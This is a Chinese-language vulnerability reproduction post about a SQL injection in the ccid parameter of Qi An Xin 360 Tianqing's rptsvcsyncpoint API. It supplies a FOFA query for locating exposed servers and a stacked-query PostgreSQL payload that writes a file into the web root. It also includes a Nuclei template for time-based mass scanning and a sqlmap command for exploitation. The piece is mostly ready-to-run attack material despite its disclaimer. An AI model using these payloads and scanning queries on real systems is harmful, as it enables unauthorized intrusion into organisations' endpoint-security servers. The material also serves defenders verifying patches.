# 原创
：  漏洞复现--奇安信360天擎rptsvcsyncpointSQL注入

# 漏洞复现--奇安信360天擎rptsvcsyncpointSQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

天擎基于奇安信全新的“川陀”终端安全平台构建，集成高性能病毒查杀、漏洞防护、主动防御引擎，深度融合威胁情报、大数据分析和安全可视化等创新技术，通过系统合规与加固、威胁防御与检测、运维管控与审计、终端数据防泄漏、统一管理与运营等功能，帮助政企客户构建持续有效的终端安全能力。该产品存在SQL注入漏洞，攻击者可通过此漏洞获取服务器权限。

### 二：漏洞影响版本

奇安信360天擎

### 三：网络空间测绘查询

fofa:<br/> `banner="QiAnXin web server" || banner="360 web server" || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dfab7a0c67bac7a9db97eea67f123985.jpeg"/>

### 四：漏洞复现

POC:

```
GET /api/dp/rptsvcsyncpoint?ccid=1%27;create%20table%20O(T%20TEXT);insert%20into%20O(T)%20values(%271~%27);copy%20O(T)%20to%20%27C:\Program%20Files%20(x86)\360\skylar6\www\1.txt%27;drop%20table%20O;-- 

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7fcc56365820f7cb2c15034c056adb1f.jpeg"/><br/> 访问1.txt<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/08e4d603e31137634117a038e75e8948.jpeg"/>

### 五：批量检测

```
id: qianxin-360-tianqing-rptsvcsyncpoint-sqli

info:
  name: qianxin-360-tianqing-rptsvcsyncpoint-sqli
  author: xingyun
  severity: high
  tags: qianxin,sqli
  description: 360天擎官方版能够为用户精确检测已知病毒木马、未知恶意代码，有效防御APT攻击，360天擎存在SQL注入漏洞。
  metadata: 
    fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
    verified: true
    max-request: 1

http:
  - raw:
      - |
        @timeout: 50s
        GET /api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(3)-- HTTP/1.1
        Host: {{Hostname}}

    matchers:     
      - type: dsl
        name: mysql
        dsl:
          - "status_code_1 == 200 &amp;&amp; duration&gt;=3 &amp;&amp; contains(body,'file_count') &amp;&amp; contains(header,'application/json')"

```

### 漏洞利用

注入点在ccid，且数据库为PostgreSQL<br/> sqlmap：<br/> `python .\sqlmap.py -u https://x.x.x.x:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b7836e09245c7bd6f37ab055819c3c9f.jpeg"/>
